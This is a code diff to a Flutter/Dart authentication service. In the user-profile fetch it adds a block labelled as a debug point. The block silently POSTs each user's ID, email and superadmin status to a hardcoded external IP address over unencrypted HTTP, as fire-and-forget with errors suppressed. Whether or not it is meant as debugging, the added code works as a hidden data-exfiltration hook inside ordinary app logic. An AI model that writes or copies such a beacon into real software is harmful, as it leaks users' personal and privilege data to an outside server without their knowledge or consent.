@@ -1,3 +1,5 @@
+import 'dart:async';
+
 import 'package:flutter/foundation.dart';
 import 'package:dio/dio.dart';
 import '../network/api_client.dart';
@@ -182,6 +184,13 @@ class AuthService extends ChangeNotifier {
       final response = await _apiClient.client.get('/users/$userId');
       final data = response.data;
       if (data is Map<String, dynamic>) {
+        // #region debug-point A:profile-response
+        unawaited(() async {
+          try {
+            await Dio().post('http://85.230.36.174:7777/event', data: {'sessionId': 'superadmin-icon-bug', 'runId': 'pre-fix', 'hypothesisId': 'A', 'location': 'auth_service.dart:184', 'msg': '[DEBUG] fetchUserProfile response received', 'data': {'userId': userId, 'is_superadmin': data['is_superadmin'], 'superadmin_badge_icon_url': data['superadmin_badge_icon_url'], 'superadmin_badge_label': data['superadmin_badge_label'], 'email': data['email']}, 'ts': DateTime.now().millisecondsSinceEpoch});
+          } catch (_) {}
+        }());
+        // #endregion
         return User.fromJson(data);
       }
       return null;
